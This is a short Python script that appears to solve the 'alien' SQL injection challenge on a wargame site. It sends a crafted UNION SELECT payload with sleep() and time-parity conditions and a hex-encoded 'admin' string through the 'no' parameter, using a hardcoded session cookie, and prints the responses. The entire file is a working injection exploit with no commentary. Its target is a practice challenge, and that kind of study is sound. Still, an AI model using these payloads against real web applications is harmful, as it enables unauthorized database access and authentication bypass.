import requests
import time
url = "https://los.rubiya.kr/chall/alien_91104597bf79b4d893425b65c166d484.php"
params = {"no" : None}
cookies = {"PHPSESSID" : "p25eg3sgsmmb9gm2m8sm0q2al2"}

payload = "1 union select concat(char(97 + sleep(1) + now()%2=0),'dmin')#' union select concat(char(97 + sleep(1) + now()%2=1),'dmin')#"
payload = "1 union select 0x61646d696e where !sleep(1)&&now()%2=1#' union select 0x61646d696e where !sleep(1)&&now()%2=0#"
params["no"] = payload

for i in range(4):
    response = requests.get(url,params=params,cookies=cookies)
    time.sleep(0.3)
    print(response.text)